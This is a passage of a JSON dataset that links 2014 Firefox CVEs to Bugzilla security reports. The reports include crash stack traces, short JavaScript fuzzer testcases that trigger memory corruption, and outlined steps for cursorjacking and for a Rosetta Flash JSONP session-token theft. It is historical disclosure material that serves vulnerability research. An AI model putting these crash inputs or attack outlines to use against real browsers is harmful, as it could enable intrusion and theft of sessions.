\"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.h\" #15 0x7fb8e16f47da (libxul.so!nsThread::ProcessNextEvent(bool, bool*)+0xffa) Line 648 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsThread.cpp\" #16 0x7fb8e15ce521 (libxul.so!NS_ProcessNextEvent(nsIThread*, bool)+0xb1) Line 263 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsThreadUtils.cpp\" #17 0x7fb8e1eedbd1 (libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*)+0x311) Line 95 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/MessagePump.cpp\" #18 0x7fb8e1e5fd53 (libxul.so!MessageLoop::Run()+0x1c3) Line 226 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc\" #19 0x7fb8e400696c (libxul.so!nsBaseAppShell::Run()+0x5c) Line 161 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #20 0x7fb8e6c4c2c6 (libxul.so!nsAppStartup::Run()+0xc6) Line 268 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsAppStartup.cpp\" #21 0x7fb8e6a646e5 (libxul.so!XREMain::XRE_mainRun()+0x1de5) Line 4023 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #22 0x7fb8e6a6561a (libxul.so!XREMain::XRE_main(int, char**, nsXREAppData const*)+0x4fa) Line 4091 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #23 0x7fb8e6a6654b (libxul.so!XRE_main+0x3ab) Line 4331 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #24 0x459dcd (firefox!main+0x94d) Line 280 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsBrowserApp.cpp\" #25 0x7fb8f1c2d76c (libc.so.6!__libc_start_main+0xec) Line 226 of \"libc-start.c\" #26 0x45934c (firefox!_start+0x28) 0x603001988ce0 is located 0 bytes inside of 24-byte region [0x603001988ce0,0x603001988cf8) freed by thread T3 (Socket Thread) here: #0 0x446255 (firefox!free+0x55) Line 64 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7fb8e15c2a5d (libxul.so!nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::ShrinkCapacity(unsigned int, unsigned long)+0x14d) Line 212 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/build/../glue/nsTArray.h\" previously allocated by thread T3 (Socket Thread) here: #0 0x446395 (firefox!malloc+0x55) Line 74 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc\" #1 0x7fb8ed308588 (libmozalloc.so!moz_xmalloc+0x8) Line 52 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/memory/mozalloc/mozalloc.cpp\" Thread T3 (Socket Thread) created by T0 here: #0 0x437801 (firefox!pthread_create+0x71) Line 155 of \"/builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc\" #1 0x7fb8ef6d9be5 (libnspr4.so!_PR_CreateThread+0x4a5) Line 445 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c\" #2 0x7fb8ef6d9737 (libnspr4.so!PR_CreateThread+0x17) Line 528 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c\" Shadow bytes around the buggy address: 0x0c0680329140: fa fa fa fa fa fa fa fa fd fd fd fd fa fa fd fd 0x0c0680329150: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fa fa 0x0c0680329160: fa fa fa fa fa fa 00 00 00 fa fa fa fa fa fa fa 0x0c0680329170: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd 0x0c0680329180: fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c0680329190: fa fa fa fa fa fa fd fd fd fa fa fa[fd]fd fd fa 0x0c06803291a0: fa fa fa fa fa fa fa fa fd fd fd fd fa fa 00 00 0x0c06803291b0: 02 fa fa fa fd fd fd fa fa fa fd fd fd fd fa fa 0x0c06803291c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c06803291d0: fa fa fa fa fa fa fa fa 00 00 00 00 fa fa fd fd 0x0c06803291e0: fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==14607==ABORTING"
      }
    ],
    "CVE-2014-1534": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995817",
        "title": "Differential Testing: Incorrect result when division-by-zero is used in an indirectly-truncated context",
        "description": "setJitCompilerOption('baseline.usecount.trigger', 1) let r; (function() { function f() { return (1 + -1 / 0) << null } print(f()) print(f()) })() $ ./js-opt-64-dm-ts-darwin-ebdf2740dc3e --fuzzing-safe --ion-parallel-compile=off 5098.js 0 0 $ ./js-opt-64-dm-ts-darwin-ebdf2740dc3e --fuzzing-safe --ion-parallel-compile=off --ion-eager 5098.js 0 1 (Tested this on 64-bit Mac js opt threadsafe deterministic shell off m-c rev ebdf2740dc3e) My configure flags are: CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --enable-optimize --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe <other NSPR options> autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/f98f80d2126c user: Jan de Mooij date: Sat Sep 28 11:45:21 2013 +0200 summary: Bug 915763 - Remove TypeScript::dynamicList and dynamic Monitor functions. r=bhackett Jan, is bug 915763 a possible regressor?"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995816",
        "title": "Differential Testing: Different output message involving gc",
        "description": "let t; (function() { f = (function() { return (1 + -1 / 0) | 0 }) })() f() gc() print(f()) $ ./js-opt-64-dm-ts-darwin-ebdf2740dc3e --fuzzing-safe --ion-parallel-compile=off 2375.js 0 $ ./js-opt-64-dm-ts-darwin-ebdf2740dc3e --fuzzing-safe --ion-parallel-compile=off --ion-eager 2375.js 1 My configure flags are: CC=\"clang -Qunused-arguments\" CXX=\"clang++ -Qunused-arguments\" AR=ar sh /Users/skywalker/trees/mozilla-central/js/src/configure --target=x86_64-apple-darwin12.5.0 --enable-optimize --disable-debug --enable-profiling --enable-gczeal --enable-debug-symbols --disable-tests --enable-more-deterministic --with-ccache --enable-threadsafe <other NSPR options> autoBisect shows this is probably related to the following changeset: The first bad revision is: changeset: http://hg.mozilla.org/mozilla-central/rev/3bada9bbc132 user: Jon Coppeard date: Mon Dec 16 08:57:37 2013 +0000 summary: Bug 950006 - Don't skip zeal GCs if allocating without the possibility of GC r=billm Jon, is bug 950006 a possible regressor? Setting this s-s just because gc seems to be involved, but I'll grab a random choice and pick sec-high for now - please feel free to change this as necessary."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1000598",
        "title": "Use after free JS_ASSERT(arenaHeader()->allocated());",
        "description": "Seen on nexus 4 with debug gecko and current trunk. STR: Go to maps.google.com press GPS icon a few times and keep zooming and moving around Program received signal SIGSEGV, Segmentation fault. 0xb5e56b56 in js::gc::Cell::isMarked (color=<optimized out>, this=<optimized out>) at ../../../js/src/gc/Heap.h:1018 1018 JS_ASSERT(arenaHeader()->allocated()); (gdb) bt #0 0xb5e56b56 in js::gc::Cell::isMarked (color=<optimized out>, this=<optimized out>) at ../../../js/src/gc/Heap.h:1018 #1 0xb5e5722e in js::gc::Cell::isMarked (this=0xb0684440, color=0) at ../../../js/src/gc/Heap.h:1021 #2 0xb5e5746a in js::gc::IsAboutToBeFinalized<js::UnownedBaseShape> (thingp=<optimized out>) at ../../../js/src/gc/Marking.cpp:388 #3 0xb5fe9cc6 in js::types::TypeCompartment::sweep (this=0xb0984834, fop=<optimized out>) at ../../../js/src/jsinfer.cpp:4166 #4 0xb5fea894 in js::types::TypeZone::sweep (this=0xb0983694, fop=0xbeb836b8, releaseTypes=<optimized out>, oom=0xbeb83677) at ../../../js/src/jsinfer.cpp:4425 #5 0xb5e6ccc2 in JS::Zone::sweep (this=0xb0983400, fop=0xbeb836b8, releaseTypes=false, oom=0xbeb83677) at ../../../js/src/gc/Zone.cpp:119 #6 0xb5fd891e in BeginSweepingZoneGroup (rt=0xb31e4000) at ../../../js/src/jsgc.cpp:3718 #7 0xb5fda0d4 in BeginSweepPhase (rt=0xb31e4000, lastGC=<optimized out>) at ../../../js/src/jsgc.cpp:3822 #8 0xb5fdb7ba in IncrementalCollectSlice (rt=0xb31e4000, budget=<optimized out>, reason=JS::gcreason::ALLOC_TRIGGER, gckind=js::GC_NORMAL) at ../../../js/src/jsgc.cpp:4428 #9 0xb5fdbc92 in GCCycle (rt=0xb31e4000, incremental=<optimized out>, budget=0, gckind=js::GC_NORMAL, reason=JS::gcreason::ALLOC_TRIGGER) at ../../../js/src/jsgc.cpp:4564 #10 0xb5fdbff0 in Collect (rt=0xb31e4000, incremental=<optimized out>, budget=30000, gckind=js::GC_NORMAL, reason=JS::gcreason::ALLOC_TRIGGER) at ../../../js/src/jsgc.cpp:4697 #11 0xb5fdc296 in js::gc::GCIfNeeded (cx=<optimized out>) at ../../../js/src/jsgc.cpp:4840 #12 0xb5fa2aca in js::InvokeInterruptCallback (cx=0xb3cbec60) at ../../../js/src/jscntxt.cpp:1020 #13 0xb3d62d2c in ?? () #14 0xb3d62d2c in ?? () Backtrace stopped: previous frame identical to this frame (corrupt stack?) (gdb) f 3 #3 0xb5fe9cc6 in js::types::TypeCompartment::sweep (this=0xb0984834, fop=<optimized out>) at ../../../js/src/jsinfer.cpp:4166 4166 if (IsTypeObjectAboutToBeFinalized(&typeObject)) (gdb) p typeObject $5 = (js::types::TypeObject *) 0xb0684440 (gdb) p *typeObject $6 = {<js::gc::BarrieredCell<js::types::TypeObject>> = {<js::gc::Cell> = {<No data fields>}, <No data fields>}, clasp_ = 0x4b4b4b4b, proto_ = {<js::BarrieredPtr<JSObject, unsigned int>> = {{value = 0x4b4b4b4b, other = 1263225675}}, <No data fields>}, singleton_ = {<js::BarrieredPtr<JSObject, unsigned int>> = {{value = 0x4b4b4b4b, other = 1263225675}}, <No data fields>}, static LAZY_SINGLETON = 1, flags_ = 1263225675, addendum = {<js::BarrieredPtr<js::types::TypeObjectAddendum, unsigned int>> = {{value = 0x4b4b4b4b, other = 1263225675}}, <No data fields>}, propertySet = 0x4b4b4b4b, interpretedFunction = {<js::BarrieredPtr<JSFunction, unsigned int>> = {{value = 0x4b4b4b4b, other = 1263225675}}, <No data fields>}, padding = 1263225675}"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=990868",
        "title": "limit ChannelMergerNode output channel count",
        "description": "+++ This bug was initially created as a clone of Bug #990794 +++ If we land a fix for the size calculation in bug 990794, then that leave a DOS bug, which can be fixed by limiting the channel count. Fixing the DOS gives away more information about how to induce the integer and heap overflow, so we have the option of landing this fix separately. See also bug 987679 which can be induced through large channel counts."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=973874",
        "title": "Crash [@ js::jit::Simulator::instructionDecode] with poisoned pointer (0xdeadbeef)",
        "description": "The following testcase crashes on mozilla-central revision 339f0d450d46 (x86 ARM simulator build, run with --fuzzing-safe --ion-eager --ion-check-range-analysis): function test() { eval(\"var M4x4 = {};\\ M4x4.mul = function M4x4_mul(a, r) {\\ a11 = a[0];\\ a21 = a[1];\\ a23 = a[9];\\ a33 = M4x4_mul[10];\\ return r;\\ };\\ M4x4.makeLookAt = function() {\\ tm1 = Float32Array(16);\\ tm2 = Float32Array(16);\\ r = new Float32Array(16);\\ return M4x4.mul(tm1, tm2, r);\\ };\\ for(j = 0; j < 3; j++)\\ M4x4.mul(M4x4.makeLookAt(), M4x4.makeLookAt());\\ \"); } test();"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=996536",
        "title": "Assertion failure: isInterpretedLazy() && u.i.s.lazy_, at jsfun.h:328 or Crash [@ JSFunction::lazyScript] or Crash [@ js::ExclusiveContext::getNewType] with gcPreserveCode",
        "description": "The following testcase asserts on mozilla-central revision 5b6e82e7bbbf (run with --fuzzing-safe --ion-eager): gcPreserveCode(); var lfcode = new Array(); lfcode.push = loadFile; lfcode.push(\"\\ function f() {}\\ res = new f();\\ var otherGlobalDifferentCompartment = newGlobal();\\ eval = otherGlobalDifferentCompartment.eval;\\ assertEq(res[(27)], otherGlobalDifferentCompartment);\\ \"); lfcode.push(\"setObjectMetadataCallback(function(obj) {});\"); lfcode.push(\"gczeal(2,1);\"); lfcode.push(\"var obj = new Intl.DateTimeFormat();\"); function loadFile(lfVarx) { try { eval(lfVarx); } catch (lfVare) {} }"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=969549",
        "title": "Faulty: PCompositableTransaction reinterprets between layer types based on untrusted message params",
        "description": "Found by Christoph Diehl's \"Faulty\" fuzzer, see bug 777067 This is similar to bug 968833, but now for the PCompositableTransaction protocol."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1002340",
        "title": "Shutdown crash with many mozGetUserMedia calls",
        "description": "1. Load the testcase in an ASan build of Firefox 2. Quit Firefox Result: it usually crashes, but not always in the same place"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1005578",
        "title": "nsStandardURL::SetHost called net_ToLowerCase with a bogus pointer, #2",
        "description": "Same symptoms as bug 991471, different testcase."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=978652",
        "title": "Navigating while new Workers are queued causes all kinds of trouble",
        "description": "When I load the testcase, one or more things goes wrong: Crash [@ PresShell::ClearImageVisibilityVisited] ###!!! ASSERTION: This is unsafe! Fix the caller!: 'Error', file dom/events/nsEventDispatcher.cpp, line 447 [Exception... \"Component returned failure code: 0x80570027 (NS_ERROR_XPC_SECURITY_MANAGER_VETO) [nsIDOMJSWindow.frames]\" nsresult: \"0x80570027 (NS_ERROR_XPC_SECURITY_MANAGER_VETO)\" location: \"JS frame :: resource://app/modules/sessionstore/FrameTree.jsm :: walk :: line 136\" data: no] ###!!! ABORT: How did we get here? Are we failing to notify listeners that we should notify?: 'mDocument->IsBeingUsedAsImage()', file layout/base/nsPresContext.cpp, line 1909 JavaScript error: chrome://browser/content/tabbrowser.xml, line 3163: NS_ERROR_NOT_INITIALIZED: Component not initialized"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1007223",
        "title": "AudioContext::DecodeAudioData passes ArrayBuffer data across threads without transferring it",
        "description": "void AudioContext::DecodeAudioData(const ArrayBuffer& aBuffer, DecodeSuccessCallback& aSuccessCallback, const Optional<OwningNonNull<DecodeErrorCallback> >& aFailureCallback) { // Sniff the content of the media. // Failed type sniffing will be handled by AsyncDecodeMedia. nsAutoCString contentType; NS_SniffContent(NS_DATA_SNIFFER_CATEGORY, nullptr, aBuffer.Data(), aBuffer.Length(), contentType); nsRefPtr<DecodeErrorCallback> failureCallback; if (aFailureCallback.WasPassed()) { failureCallback = &aFailureCallback.Value(); } nsRefPtr<WebAudioDecodeJob> job( new WebAudioDecodeJob(contentType, this, aBuffer, &aSuccessCallback, failureCallback)); mDecoder.AsyncDecodeMedia(contentType.get(), aBuffer.Data(), aBuffer.Length(), *job); // Transfer the ownership to mDecodeJobs mDecodeJobs.AppendElement(job); } When |aBuffer| is passed to |WebAudioDecodeJob|, the underlying object is cached in the decode job. We pass in the length and the raw data from the ArrayBuffer into AsyncDecodeMedia. In there we create a |new MediaDecodeTask(aContentType, aBuffer, aLength, aDecodeJob, mThreadPool);|, then |CreateReader()| on it. That creates a |BufferMediaResource| passing in the raw buffer pointer. And |BufferMediaResource| does all sorts of stuff to what's in the pointer/length pair. Boo-urns. Or am I misreading this somehow? (Of course, this is all problematic because the buffer passed into decodeAudioData is user-controlled and can be neutered at any point after the call completes [but before the decoding task stuff completes]. Or the data could be moved around there's sufficiently little of it and someone does something that requests a *stable* address for the data, causing the data to be copied into heap-allocated permanent [modulo neutering] storage. Just to absolutely clear to any readers not fully on top of this.)"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=969517",
        "title": "Faulty/ASan: heap-use-after-free of a LayerComposite that was destroyed by ContainerLayer::RemoveChild",
        "description": "Found by Christoph Diehl's \"Faulty\" fuzzer, see bug 777067"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1000960",
        "title": "Assertion failure: isObject(), at js/Value.h:1156 or Crash [@ JSObject::getGeneric]",
        "description": "The following testcase asserts on mozilla-central revision 1d0496e30feb (x86 ARM simulator build, run with --fuzzing-safe --ion-eager): function testFloat32SetElemIC(a) { for (var i = 0; i < a.length; i++) { var r = Math.fround(Number.MAX_VALUE); a[i] = r; assertEq(a[i], r); } } testFloat32SetElemIC(new Array(2048)); testFloat32SetElemIC(new Float32Array(2048));"
      }
    ],
    "CVE-2014-1539": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=995603",
        "title": "Cursor can be totally invisible using flash object and div",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0 (Beta/Release) Build ID: 20140314220517 Steps to reproduce: firstly i would to say that it's not a flash issue and it's works only for firefox for mac os x (don't works on WINDOWS , don't works on Google Chrome , don't works on Opera, don't works on safari). when you go on a flash object that defined the cursor like unvisible and you go on a <div> with the cursor , the cursor is totaly unvisible (don't works on WINDOWS , don't works on Google Chrome , don't works on Opera, don't works on safari). This can lead to clickjacking , cursorjacking , spoofing or others... steps: 1 : go to the flash object (in center into the flash object) 2 : wait 2 s 3 : go with your cursor down (div t2) 4 : Cursor are cursor-jacked (view this youtube video for more details => https://www.youtube.com/watch?v=5Lu8pcWvUVY&feature=youtu.be ) Actual results: Cursor are totaly unsibile , when you try to install a xpi , the cursor is totally unvisible. Expected results: this can be used for clickjacking / cursorjacking / spoofing or others , this issue works only on Firefox for MAC ."
      }
    ],
    "CVE-2014-1542": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=991533",
        "title": "limit AudioBuffer channel counts and sample rate range",
        "description": "Bug 987679 identified a critical security bug using the Speex resampler with extreme down-sampling ratios and/or channel counts. When the resampler code is patched to fix that, there still remains a null deref crash. We don't need to handle so many channels and large numbers of channels have led to other security bugs such as bug 990794. There have been previous attempts to limit the number of channels in bug 877039 and bug 987976 but there are still ways to go beyond the intended limit of 32 channels. We can't hope to support extreme down-sampling ratios successfully because this requires processing a huge number of input samples per output sample, so there is little harm in applying a limit on sample rates."
      }
    ],
    "CVE-2014-1543": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1011859",
        "title": "Heap memory corruption by navigator.getGamepads()",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 Steps to reproduce: Run the attached reproduction case (HeapCorrupt_getGamepads_Repro.html) with firefox debug build. Reproduction case: <script> navigator.getGamepads(); </script> Firefox version: 31.0a1 (2014-04-26), debug build Operating System: Windows 8, 64 bit Actual results: Windows debug heap reports heap corruptions: Critical error detected c0000374 firefox.exe has triggered a breakpoint. First-chance exception at 0x7771AA3C (ntdll.dll) in firefox.exe: 0xC0000374: A heap has been corrupted (parameters: 0x7772FE38). Unhandled exception at 0x7771AA3C (ntdll.dll) in firefox.exe: 0xC0000374: A heap has been corrupted (parameters: 0x7772FE38). Stack Trace: ntdll.dll!_RtlReportCriticalFailure@8() Unknown ntdll.dll!_RtlpReportHeapFailure@4() Unknown ntdll.dll!_RtlpLogHeapFailure@24() Unknown ntdll.dll!@RtlpLowFragHeapAllocFromContext@16() Unknown ntdll.dll!_RtlAllocateHeap@12() Unknown msvcr120.dll!malloc(unsigned int size) Line 92 C > mozalloc.dll!moz_xmalloc(unsigned int size) Line 52 C++ xul.dll!nsTArray_base<nsTArrayInfallibleAllocator,nsTArray_CopyWithMemutils>::EnsureCapacity(unsigned int capacity, unsigned int elemSize) Line 119 C++ xul.dll!mozilla::dom::Gamepad::Gamepad(nsISupports * aParent, const nsAString_internal & aID, unsigned int aIndex, mozilla::dom::GamepadMappingType aMapping, unsigned int aNumButtons, unsigned int aNumAxes) Line 36 C++ xul.dll!mozilla::dom::Gamepad::Clone(nsISupports * aParent) Line 101 C++ xul.dll!mozilla::dom::GamepadService::SetWindowHasSeenGamepad(nsGlobalWindow * aWindow, unsigned int aIndex, bool aHasSeen) Line 457 C++ xul.dll!mozilla::dom::GamepadService::NewAxisMoveEvent(unsigned int aIndex, unsigned int aAxis, double aValue) Line 287 C++ xul.dll!`anonymous namespace'::GamepadEvent::Run() Line 278 C++ xul.dll!nsThread::ProcessNextEvent(bool mayWait, bool * result) Line 715 C++ xul.dll!NS_ProcessNextEvent(nsIThread * thread, bool mayWait) Line 263 C++ xul.dll!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate * aDelegate) Line 136 C++ xul.dll!MessageLoop::RunHandler() Line 223 C++ xul.dll!MessageLoop::Run() Line 197 C++ xul.dll!nsBaseAppShell::Run() Line 166 C++ xul.dll!nsAppShell::Run() Line 188 C++ xul.dll!nsAppStartup::Run() Line 279 C++ xul.dll!XREMain::XRE_mainRun() Line 4019 C++ xul.dll!NS_TableDrivenQI(void * aThis, const nsID & aIID, void * * aInstancePtr, const QITableEntry * entries) Line 17 C++ xul.dll!nsComponentManagerImpl::QueryInterface(const nsID & aIID, void * * aInstancePtr) Line 823 C++ xul.dll!nsQueryInterface::operator()(const nsID & aIID, void * * answer) Line 19 C++ xul.dll!nsCOMPtr_base::assign_from_qi(const nsQueryInterface qi, const nsID & iid) Line 56 C++ Registers: EAX = 001DF37C EBX = 157EAEB0 ECX = 00000001 EDX = 001DF211 ESI = 00000005 EDI = 11161484 EIP = 60BD1412 ESP = 001DF550 EBP = 00000008 EFL = 00000000 Expected results: No heap corruption should happen."
      }
    ],
    "CVE-2014-1546": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1036213",
        "title": "[SECURITY] Add '/**/' before jsonrpc.cgi callback to avoid swf content type sniff vulnerability",
        "description": "User Agent: Mozilla/5.0 (X11; Linux i686 (x86_64)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 Steps to reproduce: Hi, I think you may already know about this vulnerability(no, take a look - miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/) this vulnerability allows the page jsonrpc.cgi as a swf file then resulting in http request in local webserver(bugzilla.mozilla.org). To patch that add '/**/' before the callback function. Reproduce: 1. Log in bugzilla. 2. open poc.html(attached) 3. wait 10 seconds 4. you will be redirected to a page that contains the source code of 'bugzilla.mozilla.org'(was got via victim browser) so it contains your session security token. Cheers,"
      }
    ],
    "CVE-2014-1549": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1020205",
        "title": "heap-buffer-overflow in mozilla::dom::AudioBufferSourceNodeEngine::CopyFromInputBuffer",
        "description": "Tested on: OS: Ubuntu 12.04 Firefox: ASAN build from https://ftp.mozilla.org/pub/mozilla.org/firefox/tinderbox-builds/mozilla-central-linux64-asan/1401807026/ ASAN-report: ==6994==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f37adc1aea0 at pc 0x43906e bp 0x7f37b1d150e0 sp 0x7f37b1d14898 READ of size 17179677220 at 0x7f37adc1aea0 thread T27 (MediaStreamGrph) #0 0x43906d in __interceptor_memcpy _asan_rtl_ #1 0x7f37dc4b8e09 in mozilla::dom::AudioBufferSourceNodeEngine::CopyFromInputBuffer(mozilla::AudioChunk*, unsigned int, unsigned long, unsigned int) /home/attekett/firefox/content/media/webaudio/AudioBufferSourceNode.cpp:222 #2 0x7f37dc4b830a in mozilla::dom::AudioBufferSourceNodeEngine::ProcessBlock(mozilla::AudioNodeStream*, mozilla::AudioChunk const&, mozilla::AudioChunk*, bool*) /home/attekett/firefox/content/media/webaudio/AudioBufferSourceNode.cpp:470 #3 0x7f37dc3b0d10 in mozilla::AudioNodeStream::ProcessInput(long, long, unsigned int) /home/attekett/firefox/content/media/AudioNodeStream.cpp:468 #4 0x7f37dc419781 in mozilla::MediaStreamGraphImpl::ProduceDataForStreamsBlockByBlock(unsigned int, int, long, long) /home/attekett/firefox/content/media/MediaStreamGraph.cpp:1192 #5 0x7f37dc41a83a in mozilla::MediaStreamGraphImpl::RunThread() /home/attekett/firefox/content/media/MediaStreamGraph.cpp:1356 #6 0x7f37dc435fee in mozilla::(anonymous namespace)::MediaStreamGraphInitThreadRunnable::Run() /home/attekett/firefox/content/media/MediaStreamGraph.cpp:1512 #7 0x7f37d8aade08 in nsThread::ProcessNextEvent(bool, bool*) /home/attekett/firefox/xpcom/threads/nsThread.cpp:766 #8 0x7f37d8992e09 in NS_ProcessNextEvent(nsIThread*, bool) /home/attekett/firefox/xpcom/glue/nsThreadUtils.cpp:263 #9 0x7f37d92b826c in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /home/attekett/firefox/ipc/glue/MessagePump.cpp:307 #10 0x7f37d92461fe in MessageLoop::RunInternal() /home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 #11 0x7f37d8aab375 in nsThread::ThreadFunc(void*) /home/attekett/firefox/xpcom/threads/nsThread.cpp:346 #12 0x7f37e4152e95 in _pt_root /home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:212 #13 0x7f37e766ae99 in start_thread ??:0 #14 0x7f37e67753fc in ?? ??:0 0x7f37adc1aea0 is located 0 bytes to the right of 149152-byte region [0x7f37adbf6800,0x7f37adc1aea0) allocated by thread T0 here: #0 0x45f9d5 in __interceptor_calloc _asan_rtl_ #1 0x7f37df8b439a in js_calloc(unsigned long) /home/attekett/firefox/objdir-ff-asan/js/src/../../dist/include/js/Utility.h:104 #2 0x7f37df8b5563 in js::ArrayBufferObject::stealContents(JSContext*, JS::Handle<js::ArrayBufferObject*>) /home/attekett/firefox/js/src/vm/ArrayBufferObject.cpp:750 #3 0x7f37df8b9d5f in JS_StealArrayBufferContents(JSContext*, JS::Handle<JSObject*>) /home/attekett/firefox/js/src/vm/ArrayBufferObject.cpp:1124 #4 0x7f37dc48dd87 in mozilla::dom::StealJSArrayDataIntoThreadSharedFloatArrayBufferList(JSContext*, nsTArray<JSObject*> const&) /home/attekett/firefox/content/media/webaudio/AudioBuffer.cpp:223 #5 0x7f37dc49094d in mozilla::dom::AudioBufferSourceNode::SendBufferParameterToStream(JSContext*) /home/attekett/firefox/content/media/webaudio/AudioBufferSourceNode.cpp:633 #6 0x7f37da247406 in mozilla::dom::AudioBufferSourceNode::SetBuffer(JSContext*, mozilla::dom::AudioBuffer*) /home/attekett/firefox/objdir-ff-asan/dom/bindings/../../dist/include/mozilla/dom/AudioBufferSourceNode.h:56 #7 0x7f37db141107 in mozilla::dom::GenericBindingSetter(JSContext*, unsigned int, JS::Value*) /home/attekett/firefox/dom/bindings/BindingUtils.cpp:2316 #8 0x7f37df9e9c13 in js::CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) /home/attekett/firefox/js/src/jscntxtinlines.h:239 #9 0x7f37df974ace in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) /home/attekett/firefox/js/src/vm/Interpreter.cpp:511 #10 0x7f37df9eb9dd in js::InvokeGetterOrSetter(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /home/attekett/firefox/js/src/vm/Interpreter.cpp:583 #11 0x7f37df7ad310 in js::Shape::set(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSObject*>, bool, JS::MutableHandle<JS::Value>) /home/attekett/firefox/js/src/vm/Shape-inl.h:95 #12 0x7f37df7aea18 in bool js::baseops::SetPropertyHelper<(js::ExecutionMode)0>(js::ExecutionModeTraits<(js::ExecutionMode)0>::ContextType, JS::Handle<JSObject*>, JS::Handle<JSObject*>, JS::Handle<jsid>, js::baseops::QualifiedBool, JS::MutableHandle<JS::Value>, bool) /home/attekett/firefox/js/src/jsobj.cpp:5069 #13 0x7f37df9cf7cb in SetPropertyOperation(JSContext*, JS::Handle<JSScript*>, unsigned char*, JS::Handle<JS::Value>, JS::Handle<JS::Value>) /home/attekett/firefox/js/src/vm/Interpreter.cpp:314 #14 0x7f37df9c056c in js::RunScript(JSContext*, js::RunState&) /home/attekett/firefox/js/src/vm/Interpreter.cpp:402 #15 0x7f37df9ea161 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) /home/attekett/firefox/js/src/vm/Interpreter.cpp:474 #16 0x7f37df974ace in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value const*, JS::MutableHandle<JS::Value>) 